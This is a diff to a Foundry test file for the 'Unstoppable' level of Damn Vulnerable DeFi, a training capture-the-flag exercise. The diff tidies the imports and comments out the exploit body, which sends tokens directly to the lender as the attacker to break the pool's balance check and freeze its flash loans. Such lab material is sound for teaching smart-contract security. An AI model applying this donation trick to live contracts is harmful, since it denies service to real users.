@@ -1,19 +1,19 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.8.0;
+pragma solidity >=0.8.14;
 
-import {stdStorage, StdStorage, Test} from "forge-std/Test.sol";
-import {console} from "forge-std/console.sol";
+// https://stermi.medium.com/damn-vulnerable-defi-challenge-1-unstoppable-92bacdefafcc
+
+import {Test} from "forge-std/Test.sol";
+import {stdStorage, StdStorage} from "forge-std/Test.sol";
 import {Vm} from "forge-std/Vm.sol";
+import {console} from "forge-std/console.sol";
+import {Utilities} from "../Utilities.sol";
 
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../src/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
 
-import {Utilities} from "../Utilities.sol";
-
 contract Unstoppable is Test {
-    //Vm internal immutable vm = Vm(HEVM_ADDRESS);
-
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
     uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
 
@@ -26,7 +26,6 @@ contract Unstoppable is Test {
 
     function setUp() public {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-
         utils = new Utilities();
         address payable[] memory users = utils.createUsers(2);
         attacker = users[0];
@@ -63,17 +62,17 @@ contract Unstoppable is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
-        vm.startPrank(attacker);
+        // vm.startPrank(attacker);
 
-        token.balanceOf(address(unstoppableLender));
-        // console.log(unstoppableLender.poolBalance());
+        // token.balanceOf(address(unstoppableLender));
+        // // console.log(unstoppableLender.poolBalance());
 
-        token.transfer(address(unstoppableLender), 1e18);
+        // token.transfer(address(unstoppableLender), 1e18);
 
-        token.balanceOf(address(unstoppableLender));
-        // console.log(unstoppableLender.poolBalance());
+        // token.balanceOf(address(unstoppableLender));
+        // // console.log(unstoppableLender.poolBalance());
 
-        vm.stopPrank();
+        // vm.stopPrank();
 
         /** EXPLOIT END **/
 
